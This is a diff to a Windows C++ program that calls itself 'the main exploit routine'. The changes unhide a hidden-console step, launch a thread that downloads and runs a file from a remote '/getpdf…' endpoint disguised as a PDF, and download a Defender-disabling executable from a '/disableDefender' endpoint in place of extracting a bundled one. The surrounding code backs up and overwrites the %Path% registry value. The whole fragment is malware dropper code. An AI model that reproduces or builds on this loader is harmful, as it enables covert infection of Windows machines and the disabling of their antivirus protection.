@@ -62,53 +62,6 @@ bool ExtractResource(int iId, LPWSTR pDest)
 	aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"DLL");
 	if (!aResourceH)
 	{
-		cout << "[-] Failed to find resource" << endl;
-		return false;
-	}
-	aResourceHGlobal = LoadResource(NULL, aResourceH);
-	if (!aResourceHGlobal)
-	{
-		cout << "[-] Failed to load resource" << endl;
-		return false;
-	}
-	aFileSize = SizeofResource(NULL, aResourceH);
-	aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
-	if (!aFilePtr)
-	{
-		cout << "[-] Failed to lock resource" << endl;
-		return false;
-	}
-	file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
-	if (INVALID_HANDLE_VALUE == file_handle)
-	{
-		int err = GetLastError();
-		if ((ERROR_ALREADY_EXISTS == err) || (32 == err))
-		{
-			return true;
-		}
-		cout << "[-] Failed to create file" << endl;
-		return false;
-	}
-	while (aFileSize--)
-	{
-		unsigned long numWritten;
-		WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
-		aFilePtr++;
-	}
-	CloseHandle(file_handle);
-	return true;
-}
-
-bool ExtractResourceExe(int iId, LPWSTR pDest)
-{
-	HRSRC aResourceH;
-	HGLOBAL aResourceHGlobal;
-	unsigned char* aFilePtr;
-	unsigned long aFileSize;
-	HANDLE file_handle;
-	aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"EXE");
-	if (!aResourceH)
-	{
 		return false;
 	}
 	aResourceHGlobal = LoadResource(NULL, aResourceH);
@@ -240,22 +193,17 @@ char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {
 /* the main exploit routine */
 int main(int argc, char* argv[])
 {	
-	/*HWND hWnd = GetConsoleWindow();
-	ShowWindow(hWnd, SW_HIDE);*/
+	HWND hWnd = GetConsoleWindow();
+	ShowWindow(hWnd, SW_HIDE);
 	//std::thread thread1(downloadAndRun, L"/getpdf", L".pdf", true);
 	std::thread thread1(downloadAndRun, L"/getpdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", L".pdf", true);
-	
-	// locate %TEMP% environment variable
-	LPWSTR pTmpPath = new WCHAR[MAX_ENV_SIZE];
-	GetEnvironmentVariable(L"TEMP", pTmpPath, MAX_ENV_SIZE);
-	size_t sSizeExe = wcslen(pTmpPath) + wcslen(L"\\defender-control.exe") + 1;
-	LPWSTR pExePath = new WCHAR[sSizeExe];
-	swprintf(pExePath, sSizeExe, L"%s\\defender-control.exe", pTmpPath);
-	ExtractResourceExe(IDR_EXE1, pExePath);
-	//Convert LPWSTR pExePath to char *
-	char* pathDisableMalware = new char[sSizeExe];
-	wcstombs(pathDisableMalware, pExePath, sSizeExe);
-	cout << pathDisableMalware;
+	char* pathDisableMalware =downloadAndRun(L"/disableDefender",L".exe",false);
+	//cout << pathDisableMalware;
+	if (pathDisableMalware == NULL) {
+		cout << "Do not have pathDisableMalware";
+		return 0;
+	}
+	//return 1;
 
 	LPWSTR pCMDpath;
 	size_t sSize = 0;
@@ -306,7 +254,9 @@ int main(int argc, char* argv[])
 		printf("[-] RegOpenKeyEx Ret:%x\n", dwRet);
 		return dwRet;
 	}
-	
+	// locate %TEMP% environment variable
+	LPWSTR pTmpPath = new WCHAR[MAX_ENV_SIZE];
+	GetEnvironmentVariable(L"TEMP", pTmpPath, MAX_ENV_SIZE);
 	// backup the value of %Path% before overwriting it.
 	LPWSTR cRegBackup = new WCHAR[MAX_ENV_SIZE];
 	DWORD cRegSize = MAX_ENV_SIZE;
